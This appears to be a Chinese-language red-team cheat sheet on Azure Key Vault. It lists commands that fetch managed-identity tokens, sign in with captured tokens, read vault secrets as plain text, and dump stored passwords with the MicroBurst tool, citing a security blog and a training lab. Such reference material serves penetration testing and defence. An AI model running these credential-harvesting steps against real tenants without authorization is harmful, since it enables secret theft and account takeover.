# Azure 服务 - 密钥保管库 (KeyVault)

## 访问令牌 (Access Token)

* 密钥保管库 (Keyvault) 访问令牌

    ```powershell
    curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
    curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
    ```

* 使用访问令牌进行连接

    ```ps1
    PS> $token = 'eyJ0..'
    PS> $keyvaulttoken = 'eyJ0..'
    PS> $accid = '2e...bc'
    PS Az> Connect-AzAccount -AccessToken $token -AccountId $accid -KeyVaultAccessToken $keyvaulttoken
    ```

## 查询机密 (Query Secrets)

* 查询保管库 (vault) 和机密 (secrets)

    ```ps1
    PS Az> Get-AzKeyVault
    PS Az> Get-AzKeyVaultSecret -VaultName <保管库名称>
    PS Az> Get-AzKeyVaultSecret -VaultName <保管库名称> -Name Reader -AsPlainText
    ```

* 从自动化 (Automations)、应用服务 (AppServices) 和密钥保管库 (KeyVaults) 中提取密码

    ```powershell
    Import-Module Microburst.psm1
    PS Microburst> Get-AzurePasswords
    PS Microburst> Get-AzurePasswords -Verbose | Out-GridView
    ```

## 参考资料 (References)

* [Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen](https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/)
* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)
